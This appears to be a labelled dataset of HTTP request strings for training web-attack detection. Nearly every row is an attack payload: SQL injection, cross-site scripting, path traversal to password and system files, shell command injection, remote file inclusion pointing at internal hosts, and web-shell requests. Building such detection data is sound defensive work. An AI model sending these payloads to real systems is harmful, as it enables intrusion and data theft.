sentences 	 labels
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo jtlwwu )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 0
/ review . php ? id = 1 & cat =  & subcat =  "  >  < script > alert (  ' phpmydirectory_multiple_xss . nasl '  )  ;  <  / script >  \r\n\r\n 	 0
/ examples / servlets / servletmultihtml . pl ? multi =  / etc / passwd \ x00html  \r\n\r\n 	 0
/ cacti / sgdynamo . exe ? htname =  < script > foo <  / script >  \r\n\r\n 	 0
/ forum . asp ? n =  .  .  /  .  .  / boot . ini | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  .  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  "  " duuw "  "  =  "  " duuw  \r\n\r\n 	 0
/ examples / servlets / servlet / story . pl ? next =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as pjkd where 1105 = 1105 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  --  \r\n\r\n 	 0
/ examples / jsp / num / php . cgi ?  / etc / passwd  \r\n\r\n 	 0
/ scripts / index . php ? op = default & date = 200607 '  union select 1 , 372196707 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' cgbf '  like  ' cgbf  \r\n\r\n 	 0
/ string / strings / parameters = '  echo $ ifsmnpqov $  (  ( 53 + 67 )  )  $  ( echo $ ifsmnpqov ) mnpqov \  \r\n\r\n 	 0
/ string / strings / parameters = &  # 0062  \r\n\r\n 	 0
/ help . php ? q =  "  ; uname \ x09 > q51344488 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  "  " ilge "  "  like  "  " ilge  \r\n\r\n 	 0
/ string / strings / parameters = < svg xmlns =  " http :  /  / www . w3 . org / 2000 / svg "  >  < a xmlns : xlink =  " http :  /  / www . w3 . org / 1999 / xlink "  xlink : href =  " javascript : alert ( 1 )  "  >  < rect width =  " 1000 "  height =  " 1000 "  fill =  " white "  /  >  <  / a >  <  / svg >  \r\n\r\n 	 0
/ main . php ? stuff =  " del \ x0bq67582951 & rem \ x0b  \r\n\r\n 	 0
/ string / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / anacondaclip . pl ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ comments . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  ?  \r\n\r\n 	 0
/ main . php ? logout = ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 ,  ' 0 '  )  ; waitfor delay  ' 0 : 0 : 50 ;  --  \r\n\r\n 	 0
/ administrator / components / com_feederator / includes / tmsp / subscription . php ? globals [ mosconfig_absolute_path ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \r\n\r\n 	 0
/ ao22ww7y . cgi ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  \r\n\r\n 	 0
/ awstats / awstats . pl ? migrate =  | echo ;  /  .  / tmp / wgwvwkorhp . sh ; echo | awstats540737 . txt  \r\n\r\n 	 0
/ b5xdqgz2 . cfm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ top . php ? stuff =  "  & ver \ x0b > q54461117 & rem \ x0b  \r\n\r\n 	 0
/ 3j8echh0 . php3 ?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >  \r\n\r\n 	 0
/ vjbrrppi . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 0
/ javascript / recorder . exe  \r\n\r\n 	 0
/ cgi-bin / visadmin . exe  \r\n\r\n 	 0
/ string / strings / parameters = echo injqrh $  (  ( 6 + 71 )  )  $  ( echo injqrh ) injqrh '  \r\n\r\n 	 0
/ string / strings / parameters = "  ;  str =  $  ( echo baksin )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 0
/ string / strings / parameters = "  &  & echo $ ifswpyoyt $  (  ( 86 + 46 )  )  $  ( echo $ ifswpyoyt ) wpyoyt /  /  \r\n\r\n 	 0
/ cacti / sawmill6cl . exe ? ho +  { complete_version }  \r\n\r\n 	 0
/ string / strings / parameters = < script a =  `  >  `  src =  "  " http :  /  / vulnerability-lab . com / crosssitescripting . js "  "  >  <  / script >  \r\n\r\n 	 0
/ nmw0do67 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = ? x =  \r\n\r\n 	 0
/ en-us / account / man-cgi ? section = 0 & topic = ls ; id  \r\n\r\n 	 0
/ cacti / supporter / tupdate . php ? groupid = change & sg =  '  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 0
/ templates / tmpl_dfl / scripts / index . php ? dir [ inc ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 1045 = 1045 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  order by 1 --  \r\n\r\n 	 0
/ scripts / event_view . php ? eid = 34 union select 294969347  \r\n\r\n 	 0
/ examples / jsp / colors / inc / functions . inc . php ? config [ ppa_root_path ]  =  / etc / passwd \ x00  \r\n\r\n 	 0
/ site /  '  union all select filetoclob (  '  / etc / passwd '  ,  ' server '  )  :  : html , 0 from sysusers where username  =  user  --  /  . html  \r\n\r\n 	 0
/ string / modo = registro & login = percy & password =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & nombre = pars & apellidos = corral + rahal & email = healy @ ajedrezconmaestros . ch & dni = 15756299b & direccion = carrer + verge + de + l ' alba ,  + s / n +  & ciudad = san + morales & cp = 15338 & provincia = len & ntc = 8682803216185712 & b1 = registrar  \r\n\r\n 	 0
/ bl8sefdm . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 1852 = 1852 union all select null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 0
/ string / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null )   #  \r\n\r\n 	 0
/ string / strings / parameters = \ nnetstat -a %  \ n  \r\n\r\n 	 0
/ default . asp ? catid = 1234567890 '  \r\n\r\n 	 0
/ ender ' s_game /  \r\n\r\n 	 0
/ string / strings / parameters = < layer src =  "  " javascript : document . cookie = true ;  "  "  >  <  / layer >  \r\n\r\n 	 0
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904181 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  \r\n\r\n 	 0
/ javascript / aliases . exe  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  where 1107 = 1107 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  \r\n\r\n 	 0
/ i7prbs22 . aspx ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  \r\n\r\n 	 0
/ index . php ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \r\n\r\n 	 0
/ cgi-bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = "  |  | echo $ ifsrjobxi $  (  ( 9 + 83 )  )  $  ( echo $ ifsrjobxi ) rjobxi '  \r\n\r\n 	 0
/ quagynka . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ cgi-binsearch_results . dot ? search_query = nessus "  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  /  \r\n\r\n 	 0
/ string / strings / parameters = echo $ ifslixpwr $  (  ( 69 + 26 )  )  $  ( echo $ ifslixpwr ) lixpwr '  \r\n\r\n 	 0
/ fa8p8lr8 . aspx ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = "  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  "  " cxsu "  "  like  "  " cxsu  \r\n\r\n 	 0
/ phpmyadmin /  /  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows / win . ini  \r\n\r\n 	 0
/ ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ fnwhrxyd . php ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and 7533 = 7533 and  ' clqy '  like  ' clqy  \r\n\r\n 	 0
/ examples / servlets / servlet / texis . exe /  ? -dump  \r\n\r\n 	 0
/ uvazfs7p . asp ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  \r\n\r\n 	 0
/ index . php ? open = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 1093 = 1093 union all select null , null , null , null , null , null , null --  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  \r\n\r\n 	 0
/ script / common . inc . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  \r\n\r\n 	 0
/ bzuf9ozq . do ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo $ ifsonqkzz $  (  ( 73 + 7 )  )  $  ( echo $ ifsonqkzz ) onqkzz "  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo logujr )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 0
/ javascript / next . exe  \r\n\r\n 	 0
/ cgi-bin / store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  \r\n\r\n 	 0
/ top . php ? stuff =  '  & rm q28696513  #  \r\n\r\n 	 0
/ string / strings / parameters = '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  \  '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  \  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  >  <  / script >  !  --  < script > alert ( string . fromcharcode ( 88 , 83 , 83 )  )  <  / script >  =  &  {  }  \r\n\r\n 	 0
/ string / modo = registro & login = mcdavitt & password = brigosa & nombre = agapio '  + and +  ' 1 '  =  ' 1 & apellidos = san + emeterio + farzati & email = roeves @ esbien . kg & dni = 26396263z & direccion = calle + louis + pasteur + 148 ,  + 2 ? g & ciudad = bercimuel & cp = 10129 & provincia = barcelona & ntc = 1686893417722016 & b1 = registrar  \r\n\r\n 	 0
/ ao22ww7y . do ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  ' ggiw '  =  ' ggiw  \r\n\r\n 	 0
/ main . php ? stuff =  " uname  > q22289594  #  \r\n\r\n 	 0
/ en-us / hipkz026 . idc ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  \r\n\r\n 	 0
/ string / modo = insertar ?  & precio = 8384 & b1 = confirmar  \r\n\r\n 	 0
/ string / modo = registro & login = levasseu & password = embarbillado & nombre = zuleika & apellidos = peazco + arreche & email = others @ tetdevelocidad . sz & dni = 91212440y & direccion = c /  + mostoles + 25 ,  + 2c & ciudad = amposta & cp = 1812a & provincia = valencia & ntc = 1675356603176027 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 1917 = 1917 or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 0
/ m5103snj . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / modo = paros "  + style =  " background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 587 & b1 = pasar + por + caja  \r\n\r\n 	 0
/ main . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  \r\n\r\n 	 0
/ help . php ? q =  "  & rm q31935143 & rem  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo $ ifswokocd $  (  ( 20 + 68 )  )  $  ( echo $ ifswokocd ) wokocd '  \r\n\r\n 	 0
/ main . php ? logout =  & ver ,  > q24489971 & rem ,  \r\n\r\n 	 0
/ string / modo = entrar & login = juni & pwd =  +  & remember = on & b1 = entrar  \r\n\r\n 	 0
/ string / str =  $  ( echo ivbazq )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ exophpdesk_path / pipe . php ? lang_file = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = |   [  9 -ne  $  ( echo hzzokr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 0
/ help . php ? q =  ' del \ x09q97653798 \ x09 #  \r\n\r\n 	 0
/ string / modo = registro & login = mckillop & password = margraviato & nombre = leonor & apellidos = pantiga + corredor & email = miranoa @ enla . web & dni = 36674466t & direccion = mencia + calderon ,  + 170 ,  + 13b & ciudad = manzanares + de + rioja & cp = 05427 & provincia = vizcaya '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & ntc = 7784731967679465 & b1 = registrar  \r\n\r\n 	 0
/ d7ktpmcq . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ en-us / 9kr0ih0v . php3 ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  \r\n\r\n 	 0
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ezdzjg )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  #  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  and make_set ( 8403 = 8403 , 8899 )  and  '  %  '  =  '  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  \r\n\r\n 	 0
/ hipkz026 . exe ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  \r\n\r\n 	 0
/ javascript / wp . exe  \r\n\r\n 	 0
/ help . php ? q =  "  ; uname \ x09 > q21654461 \ x09 #  \r\n\r\n 	 0
/ string / modo = registro & login = saladna & passworda = na6u40476a8in & nombre = amranto & apellidos = enjuanes + corbi & email = tin @ velazquezlarraaga . aw & dni = 09894897k & direccion = c /  + 358 + 180 + 13 ? g & ciudad = sanlcar + de + barrameda & cp = 16118 & provincia = cuenca & ntc = 1923588691952780 & b1 = registrar  \r\n\r\n 	 0
/ top . php ? stuff =  " ver \ x09 > q19467518 & rem \ x09  \r\n\r\n 	 0
/ string / strings / parameters = < script src = http :  /  / ha . ckers . org / xss . js ?  <  b  >  \r\n\r\n 	 0
/ string / strings / parameters = < a onmouseover = location = ’javascript : alert ( 1 )  > click  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qeluff )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 0
/ help . php ? q =  "  & rm q44114596  #  \r\n\r\n 	 0
/ string / modo = entrar & login = schlacht & pwd = 43s8a & remember = off /  & b1 = entrar  \r\n\r\n 	 0
/ demo / ms-pe02 / catalog . php ? cid = 0 & sid =  '  "  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  &  \r\n\r\n 	 0
/ string / strings / parameters = " xss ' cx <  / img  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  ; select  ( case when  ( 3677 = 2193 )  then 3677 else 1 /  ( select 0 )  end )  --  \r\n\r\n 	 0
/ exchange /  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  union all select null , null , null , null , null , null , null , null , null , null --  \r\n\r\n 	 0
/ egaet53a . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ en-us /  < script > cross_site_scripting . nasl <  / script >  . fts  \r\n\r\n 	 0
/ string / modo = entrar & login = weatherl4 & pwd = vinazo & remember = on & b1 =  |  \r\n\r\n 	 0
/ bmeun223 . jspa ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = a )  | id ;  \r\n\r\n 	 0
/ string / str =  $  ( echo spzwvr )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ string / strings / parameters = print (  ` echo okejjb echo  $  (  ( 46 + 60 )  )  echo okejjb echo okejjb `  )  ; okejjb  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  where 7815 = 7815 union all select null , null , null , null , null , null , null #  \r\n\r\n 	 0
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  { file }  \r\n\r\n 	 0
/ string / strings / parameters = "  & echo $ ifsocygaq $  (  ( 67 + 93 )  )  $  ( echo $ ifsocygaq ) ocygaq |  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  union all select null #  \r\n\r\n 	 0
/ string / modo = entrar & login = levon & pwd = caucela & remember = off /  & b1 = entrar  \r\n\r\n 	 0
/ string / strings / parameters = |  | echo heyzba $  (  ( 8 + 23 )  )  $  ( echo heyzba ) heyzba '  \r\n\r\n 	 0
/ string / id = 2 & nombre = any ?  set-cookie :  + tamper = 5765205567234876235 & precio = 39 & cantidad = 75 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / errormsg = credenciales + incorrectas '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  |  |  ( select  ' lzvb '  where 1637 = 1637 union all select null , null , null , null , null , null , null , null #  \r\n\r\n 	 0
/ search / index . cfm ?  < script > alert (  \  " vulnerable \  "  )  <  / script >  \r\n\r\n 	 0
/ zmvq66jy . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / id = 1 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 56 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ controllers / viewcontroller . php ? basedir = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  "  " eoab "  "  like  "  " eoab  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  where 6274 = 6274 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = -1 < body background =  "  " javascript : document . cookie = true ;  "  "  >  \r\n\r\n 	 0
/ string / modo = registro & login = gi /  ? l & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = & echo jygqcn $  (  ( 44 + 48 )  )  $  ( echo jygqcn ) jygqcn \  \r\n\r\n 	 0
/ string / strings / parameters = < form formaction = popup = 1 ;  onclick = popup = 1 ;  >  < object >  \r\n\r\n 	 0
/ string / strings / parameters = "  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ vhzmaia2 . asp ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  \r\n\r\n 	 0
/ help . php ? q =  "  \ x0duname  > q43695626  #  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  ' pfal '  =  ' pfal  \r\n\r\n 	 0
/ string / strings / parameters = "  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 0
/ string / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ examples / jsp / cal / protection . php ? action = logout & siteurl =  / etc / passwd  \r\n\r\n 	 0
/ main . php ? stuff =  " rm \ x09q84368944 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = &  # 00 ;  <  / form >  < input type &  # 61 ;  " date "  onfocus =  " alert ( 1 )  "  >  \r\n\r\n 	 0
/ yver8r9o . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = "  & echo $ ifsqovijm $  (  ( 98 + 90 )  )  $  ( echo $ ifsqovijm ) qovijm /  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  as jsdc where 2748 = 2748 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual --  \r\n\r\n 	 0
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00  \r\n\r\n 	 0
/ ao22ww7y . exe ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  \r\n\r\n 	 0
/ string / strings / parameters = &  # 00 ;  <  / form >  < input type &  # 61 ;  " date "  onfocus =  " confirm ( 1 )  "  >  \r\n\r\n 	 0
/ main . php ? stuff =  "  ; del q85142671  #  \r\n\r\n 	 0
/ javascript / dumps . exe  \r\n\r\n 	 0
/ webdav / c99 . php ? act = f & f = xampp_stop . exe & d = c :  \ xampp &  \r\n\r\n 	 0
/ top . php ? stuff =  "  & ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " dppw "  "  like  "  " dppw  \r\n\r\n 	 0
/ string / strings / parameters = -2284 %  "  "  )  )  or 9323 = 9323 #  \r\n\r\n 	 0
/ p043snfr . mscgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ javascript / my . exe  \r\n\r\n 	 0
/ string / strings / parameters = -3505 "  "  )  or 5290 = 3436 --  \r\n\r\n 	 0
/ o6ebbirj . x ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ global . php ? abs_path = xxpathxx ?  \r\n\r\n 	 0
/ recordings / popup . php ? include_path =  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = -9156 '  )  )  union all select 9110 , 9110 , 9110 , 9110 #  \r\n\r\n 	 0
/ examples / servlets / servlet / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  }  \r\n\r\n 	 0
